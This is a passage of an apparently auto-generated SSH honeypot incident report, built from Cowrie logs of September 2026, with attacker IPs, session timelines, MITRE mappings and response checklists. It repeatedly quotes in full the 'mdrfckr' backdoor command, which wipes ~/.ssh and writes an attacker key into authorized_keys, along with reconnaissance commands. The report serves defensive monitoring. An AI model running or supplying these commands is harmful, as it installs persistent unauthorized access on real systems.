/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.84`, `2.57.122.150`, `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `146.190.175.10`, `139.255.254.163`, `190.5.200.98`, `140.246.137.102`, `163.7.11.155`, `116.125.120.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **94** |
| Unique ASNs | **61** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 18 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS58519` | Cloud Computing Corporation | 2 | HIGH |
| `AS51396` | Pfcloud UG | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (145)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7dfc99d27255

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-21 12:56 |
| **Last Seen** | 2026-09-21 12:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:56:08` | `cowrie.session.connect` |
| `2026-09-21 12:56:08` | `cowrie.client.version` |
| `2026-09-21 12:56:08` | `cowrie.client.kex` |
| `2026-09-21 12:56:09` | `cowrie.login.success` |
| `2026-09-21 12:56:11` | `cowrie.direct-tcpip.request` |
| `2026-09-21 12:56:12` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 12:56:12` | `cowrie.direct-tcpip.data` |
| `2026-09-21 12:56:14` | `cowrie.direct-tcpip.request` |
| `2026-09-21 12:56:15` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 12:56:15` | `cowrie.direct-tcpip.data` |
| `2026-09-21 12:56:16` | `cowrie.direct-tcpip.request` |
| `2026-09-21 12:56:18` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 12:56:18` | `cowrie.direct-tcpip.data` |
| `2026-09-21 12:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22adf2bd54c5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-21 13:04 |
| **Last Seen** | 2026-09-21 13:04 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:04:01` | `cowrie.session.connect` |
| `2026-09-21 13:04:01` | `cowrie.client.version` |
| `2026-09-21 13:04:02` | `cowrie.client.kex` |
| `2026-09-21 13:04:02` | `cowrie.login.success` |
| `2026-09-21 13:04:04` | `cowrie.direct-tcpip.request` |
| `2026-09-21 13:04:08` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 13:04:08` | `cowrie.direct-tcpip.data` |
| `2026-09-21 13:04:13` | `cowrie.direct-tcpip.request` |
| `2026-09-21 13:04:20` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 13:04:20` | `cowrie.direct-tcpip.data` |
| `2026-09-21 13:04:28` | `cowrie.direct-tcpip.request` |
| `2026-09-21 13:04:30` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 13:04:30` | `cowrie.direct-tcpip.data` |
| `2026-09-21 13:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a5737bf9ea1

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-09-21 13:36 |
| **Last Seen** | 2026-09-21 13:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:36:37` | `cowrie.session.connect` |
| `2026-09-21 13:36:37` | `cowrie.client.version` |
| `2026-09-21 13:36:37` | `cowrie.client.kex` |
| `2026-09-21 13:36:38` | `cowrie.login.success` |
| `2026-09-21 13:36:39` | `cowrie.session.params` |
| `2026-09-21 13:36:39` | `cowrie.command.input` |
| `2026-09-21 13:36:39` | `cowrie.command.failed` |
| `2026-09-21 13:36:40` | `cowrie.log.closed` |
| `2026-09-21 13:36:41` | `cowrie.session.params` |
| `2026-09-21 13:36:41` | `cowrie.command.input` |
| `2026-09-21 13:36:41` | `cowrie.session.file_download` |
| `2026-09-21 13:36:41` | `cowrie.log.closed` |
| `2026-09-21 13:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2587a69173fc

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-09-21 13:36 |
| **Last Seen** | 2026-09-21 13:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:36:41` | `cowrie.session.connect` |
| `2026-09-21 13:36:41` | `cowrie.client.version` |
| `2026-09-21 13:36:42` | `cowrie.client.kex` |
| `2026-09-21 13:36:44` | `cowrie.login.success` |
| `2026-09-21 13:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab132255787a

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-09-21 13:36 |
| **Last Seen** | 2026-09-21 13:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:36:45` | `cowrie.session.connect` |
| `2026-09-21 13:36:45` | `cowrie.client.version` |
| `2026-09-21 13:36:45` | `cowrie.client.kex` |
| `2026-09-21 13:36:47` | `cowrie.login.success` |
| `2026-09-21 13:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0e4ad90da94

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-09-21 13:39 |
| **Last Seen** | 2026-09-21 13:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:39:56` | `cowrie.session.connect` |
| `2026-09-21 13:39:56` | `cowrie.client.version` |
| `2026-09-21 13:39:57` | `cowrie.client.kex` |
| `2026-09-21 13:39:58` | `cowrie.login.success` |
| `2026-09-21 13:39:59` | `cowrie.session.params` |
| `2026-09-21 13:39:59` | `cowrie.command.input` |
| `2026-09-21 13:39:59` | `cowrie.command.failed` |
| `2026-09-21 13:39:59` | `cowrie.log.closed` |
| `2026-09-21 13:40:00` | `cowrie.session.params` |
| `2026-09-21 13:40:00` | `cowrie.command.input` |
| `2026-09-21 13:40:01` | `cowrie.session.file_download` |
| `2026-09-21 13:40:01` | `cowrie.log.closed` |
| `2026-09-21 13:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc613ade19ff

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-09-21 13:40 |
| **Last Seen** | 2026-09-21 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:40:01` | `cowrie.session.connect` |
| `2026-09-21 13:40:01` | `cowrie.client.version` |
| `2026-09-21 13:40:01` | `cowrie.client.kex` |
| `2026-09-21 13:40:02` | `cowrie.login.success` |
| `2026-09-21 13:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65975b275f0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-09-21 13:40 |
| **Last Seen** | 2026-09-21 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:40:03` | `cowrie.session.connect` |
| `2026-09-21 13:40:03` | `cowrie.client.version` |
| `2026-09-21 13:40:03` | `cowrie.client.kex` |
| `2026-09-21 13:40:04` | `cowrie.login.success` |
| `2026-09-21 13:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2902fb6fa95e

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]242` |
| **First Seen** | 2026-09-21 13:42 |
| **Last Seen** | 2026-09-21 13:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:42:30` | `cowrie.session.connect` |
| `2026-09-21 13:42:30` | `cowrie.client.version` |
| `2026-09-21 13:42:30` | `cowrie.client.kex` |
| `2026-09-21 13:42:31` | `cowrie.login.success` |
| `2026-09-21 13:42:32` | `cowrie.session.params` |
| `2026-09-21 13:42:32` | `cowrie.command.input` |
| `2026-09-21 13:42:32` | `cowrie.command.failed` |
| `2026-09-21 13:42:32` | `cowrie.log.closed` |
| `2026-09-21 13:42:33` | `cowrie.session.params` |
| `2026-09-21 13:42:33` | `cowrie.command.input` |
| `2026-09-21 13:42:33` | `cowrie.session.file_download` |
| `2026-09-21 13:42:33` | `cowrie.log.closed` |
| `2026-09-21 13:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]242` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-088d4e0cec49

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]242` |
| **First Seen** | 2026-09-21 13:42 |
| **Last Seen** | 2026-09-21 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:42:33` | `cowrie.session.connect` |
| `2026-09-21 13:42:33` | `cowrie.client.version` |
| `2026-09-21 13:42:34` | `cowrie.client.kex` |
| `2026-09-21 13:42:34` | `cowrie.login.success` |
| `2026-09-21 13:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]242` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88cf06c3e442

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]242` |
| **First Seen** | 2026-09-21 13:42 |
| **Last Seen** | 2026-09-21 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:42:35` | `cowrie.session.connect` |
| `2026-09-21 13:42:35` | `cowrie.client.version` |
| `2026-09-21 13:42:35` | `cowrie.client.kex` |
| `2026-09-21 13:42:36` | `cowrie.login.success` |
| `2026-09-21 13:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]242` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdc1096f8622

| Field | Detail |
|---|---|
| **Source IP** | `138.2.235[.]147` |
| **First Seen** | 2026-09-21 13:46 |
| **Last Seen** | 2026-09-21 13:48 |
| **Session Duration** | 92s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:46:36` | `cowrie.session.connect` |
| `2026-09-21 13:46:36` | `cowrie.client.version` |
| `2026-09-21 13:46:36` | `cowrie.client.kex` |
| `2026-09-21 13:46:36` | `cowrie.login.failed` |
| `2026-09-21 13:46:37` | `cowrie.login.success` |
| `2026-09-21 13:46:38` | `cowrie.session.params` |
| `2026-09-21 13:46:38` | `cowrie.command.input` |
| `2026-09-21 13:46:38` | `cowrie.command.failed` |
| `2026-09-21 13:46:38` | `cowrie.log.closed` |
| `2026-09-21 13:46:39` | `cowrie.session.params` |
| `2026-09-21 13:46:39` | `cowrie.command.input` |
| `2026-09-21 13:46:39` | `cowrie.log.closed` |
| `2026-09-21 13:46:39` | `cowrie.session.params` |
| `2026-09-21 13:46:39` | `cowrie.command.input` |
| `2026-09-21 13:46:40` | `cowrie.log.closed` |
| `2026-09-21 13:46:40` | `cowrie.session.params` |
| `2026-09-21 13:46:40` | `cowrie.command.input` |
| `2026-09-21 13:46:40` | `cowrie.log.closed` |
| `2026-09-21 13:46:41` | `cowrie.session.params` |
| `2026-09-21 13:46:41` | `cowrie.command.input` |
| `2026-09-21 13:46:41` | `cowrie.log.closed` |
| `2026-09-21 13:46:42` | `cowrie.session.params` |
| `2026-09-21 13:46:42` | `cowrie.command.input` |
| `2026-09-21 13:46:42` | `cowrie.log.closed` |
| `2026-09-21 13:46:43` | `cowrie.session.params` |
| `2026-09-21 13:46:43` | `cowrie.command.input` |
| `2026-09-21 13:46:43` | `cowrie.log.closed` |
| `2026-09-21 13:46:43` | `cowrie.session.params` |
| `2026-09-21 13:46:43` | `cowrie.command.input` |
| `2026-09-21 13:46:43` | `cowrie.log.closed` |
| `2026-09-21 13:46:44` | `cowrie.session.params` |
| `2026-09-21 13:46:44` | `cowrie.command.input` |
| `2026-09-21 13:46:44` | `cowrie.log.closed` |
| `2026-09-21 13:48:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.2.235[.]147` to AbuseIPDB if not already reported
- [ ] Block `138.2.235[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a004905b7e9

| Field | Detail |
|---|---|
| **Source IP** | `116.125.120[.]27` |
| **First Seen** | 2026-09-21 13:47 |
| **Last Seen** | 2026-09-21 13:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:47:38` | `cowrie.session.connect` |
| `2026-09-21 13:47:38` | `cowrie.client.version` |
| `2026-09-21 13:47:39` | `cowrie.client.kex` |
| `2026-09-21 13:47:39` | `cowrie.login.success` |
| `2026-09-21 13:47:40` | `cowrie.session.params` |
| `2026-09-21 13:47:40` | `cowrie.command.input` |
| `2026-09-21 13:47:40` | `cowrie.command.failed` |
| `2026-09-21 13:47:41` | `cowrie.log.closed` |
| `2026-09-21 13:47:41` | `cowrie.session.params` |
| `2026-09-21 13:47:41` | `cowrie.command.input` |
| `2026-09-21 13:47:42` | `cowrie.session.file_download` |
| `2026-09-21 13:47:42` | `cowrie.log.closed` |
| `2026-09-21 13:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.125.120[.]27` to AbuseIPDB if not already reported
- [ ] Block `116.125.120[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0c9eed3fbea

| Field | Detail |
|---|---|
| **Source IP** | `116.125.120[.]27` |
| **First Seen** | 2026-09-21 13:47 |
| **Last Seen** | 2026-09-21 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:47:42` | `cowrie.session.connect` |
| `2026-09-21 13:47:42` | `cowrie.client.version` |
| `2026-09-21 13:47:42` | `cowrie.client.kex` |
| `2026-09-21 13:47:43` | `cowrie.login.success` |
| `2026-09-21 13:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.125.120[.]27` to AbuseIPDB if not already reported
- [ ] Block `116.125.120[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f3fad4fdb7

| Field | Detail |
|---|---|
| **Source IP** | `116.125.120[.]27` |
| **First Seen** | 2026-09-21 13:47 |
| **Last Seen** | 2026-09-21 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:47:43` | `cowrie.session.connect` |
| `2026-09-21 13:47:43` | `cowrie.client.version` |
| `2026-09-21 13:47:43` | `cowrie.client.kex` |
| `2026-09-21 13:47:44` | `cowrie.login.success` |
| `2026-09-21 13:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.125.120[.]27` to AbuseIPDB if not already reported
- [ ] Block `116.125.120[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da15d6728af0

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
| **First Seen** | 2026-09-21 13:48 |
| **Last Seen** | 2026-09-21 13:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:48:47` | `cowrie.session.connect` |
| `2026-09-21 13:48:47` | `cowrie.client.version` |
| `2026-09-21 13:48:48` | `cowrie.client.kex` |
| `2026-09-21 13:48:49` | `cowrie.login.success` |
| `2026-09-21 13:48:50` | `cowrie.session.params` |
| `2026-09-21 13:48:50` | `cowrie.command.input` |
| `2026-09-21 13:48:50` | `cowrie.command.failed` |
| `2026-09-21 13:48:51` | `cowrie.log.closed` |
| `2026-09-21 13:48:52` | `cowrie.session.params` |
| `2026-09-21 13:48:52` | `cowrie.command.input` |
| `2026-09-21 13:48:52` | `cowrie.session.file_download` |
| `2026-09-21 13:48:52` | `cowrie.log.closed` |
| `2026-09-21 13:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b80d7a13566

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
| **First Seen** | 2026-09-21 13:48 |
| **Last Seen** | 2026-09-21 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:48:52` | `cowrie.session.connect` |
| `2026-09-21 13:48:52` | `cowrie.client.version` |
| `2026-09-21 13:48:53` | `cowrie.client.kex` |
| `2026-09-21 13:48:54` | `cowrie.login.success` |
| `2026-09-21 13:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c243540b226c

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
| **First Seen** | 2026-09-21 13:48 |
| **Last Seen** | 2026-09-21 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
